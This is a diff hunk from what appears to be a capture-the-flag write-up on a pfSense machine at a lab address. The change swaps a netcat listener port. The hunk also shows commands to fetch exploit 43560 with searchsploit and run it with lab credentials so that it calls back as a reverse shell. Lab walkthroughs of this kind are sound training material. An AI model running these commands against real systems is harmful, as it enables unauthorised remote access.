@@ -60,7 +60,7 @@ password: company defaults
 ![image](https://github.com/h4md153v63n/CTFs/assets/5091265/ff6726fb-505d-4fd4-90a8-460f9d7a5549)
 
 + Transfer the exploit: `searchsploit -m 43560`
-+ Start listener: `nc -lnvp 4444`
++ Start listener: `nc -lnvp 5555`
 + `python3 43560.py --rhost 10.10.10.60 --lhost 10.10.14.7 --lport 5555 --username rohit --password pfsense`
 
 ![image](https://github.com/h4md153v63n/CTFs/assets/5091265/d6f35b34-e308-432b-8f48-3756e6010eba)
